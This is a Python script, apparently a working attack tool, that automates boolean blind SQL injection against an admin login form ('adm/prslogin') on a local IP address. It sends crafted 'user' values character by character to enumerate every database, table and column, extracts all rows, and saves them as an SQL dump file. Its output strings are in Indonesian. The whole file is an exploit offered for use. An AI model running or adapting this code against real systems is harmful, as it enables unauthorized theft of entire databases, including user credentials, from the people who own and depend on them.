import requests
import sys
import urllib3
import os
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://192.168.1.200/langitan/adm/prslogin"

def blind_sqli(payload_template, label, dynamic_values=None, max_length=60):
    print()
    result = ""

    for i in range(1, max_length + 1):
        found = False
        for c in range(0x20, 0x7f):
            if dynamic_values:
                payload = payload_template % (*dynamic_values, i, chr(c))
            else:
                payload = payload_template % (i, chr(c))

            data = {'user': payload, 'password': 'apaaja'}

            try:
                response = requests.post(url, data=data, verify=False, allow_redirects=False)
                if response.status_code == 302:
                    result += chr(c)
                    sys.stdout.write(chr(c))
                    sys.stdout.flush()
                    found = True
                    break
            except Exception as e:
                print(f"[!] Error: {e}")
                return result

        if not found:
            break

    return result

def parse_csv(raw):
    return [x for x in dict.fromkeys(raw.split(",")) if x.strip()]

def escape_sql(val):
    return val.replace("\\", "\\\\").replace("'", "\\'")

def write_sql_file(db_name, structure):
    filename = f"sqli_{db_name}.sql"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"-- Dump database: {db_name}\n")
        f.write(f"CREATE DATABASE IF NOT EXISTS `{db_name}`;\nUSE `{db_name}`;\n\n")

        for tbl_name, (cols, rows) in structure.items():
            col_defs = ",\n  ".join([f"`{col}` TEXT" for col in cols])
            f.write(f"-- Table: {tbl_name}\n")
            f.write(f"CREATE TABLE `{tbl_name}` (\n  {col_defs}\n);\n")

            if rows:
                f.write(f"INSERT INTO `{tbl_name}` ({', '.join([f'`{c}`' for c in cols])}) VALUES\n")
                insert_lines = []
                for row in rows:
                    while len(row) < len(cols):
                        row.append("")
                    values = ', '.join([f"'{escape_sql(val)}'" for val in row])
                    insert_lines.append(f"({values})")
                f.write(",\n".join(insert_lines) + ";\n\n")

        print(f"SQL dump disimpan: {filename}")

def dump_database():
    dbs_raw = blind_sqli("abc' OR BINARY substring((SELECT group_concat(schema_name) FROM information_schema.schemata), %d, 1) = '%s' -- ", "Database List")
    dbs = [db for db in parse_csv(dbs_raw) if db.lower() != "information_schema"]

    for db in dbs:
        db_structure = {}

        tables_raw = blind_sqli("abc' OR BINARY substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = '%s'), %d, 1) = '%s' -- ", f"Tabel di DB {db}", [db])
        tables = parse_csv(tables_raw)

        for tbl in tables:
            cols_raw = blind_sqli("abc' OR BINARY substring((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = '%s' AND table_name = '%s'), %d, 1) = '%s' -- ", f"Kolom di {tbl}", [db, tbl])
            cols = parse_csv(cols_raw)

            if not cols:
                continue

            row_count_raw = blind_sqli(
                "abc' OR BINARY substring((SELECT COUNT(*) FROM %s.%s), %%d, 1) = '%%s' -- " % (db, tbl),
                f"Jumlah baris di {tbl}"
            )
            try:
                total_rows = int(row_count_raw)
            except ValueError:
                total_rows = 0

            rows = []
            for offset in range(total_rows):
                row_raw = blind_sqli(
                    "abc' OR BINARY substring((SELECT CONCAT_WS('#', %s) FROM %s.%s LIMIT %d,1), %%d, 1) = '%%s' -- " % (
                        ", ".join(cols), db, tbl, offset),
                    f"Baris ke-{offset+1} di {tbl}"
                )
                row = row_raw.split("#") if row_raw else []
                if row:
                    while len(row) < len(cols):
                        row.append("")
                    rows.append(row)

            db_structure[tbl] = (cols, rows)

        write_sql_file(db, db_structure)

if __name__ == "__main__":
    dump_database()
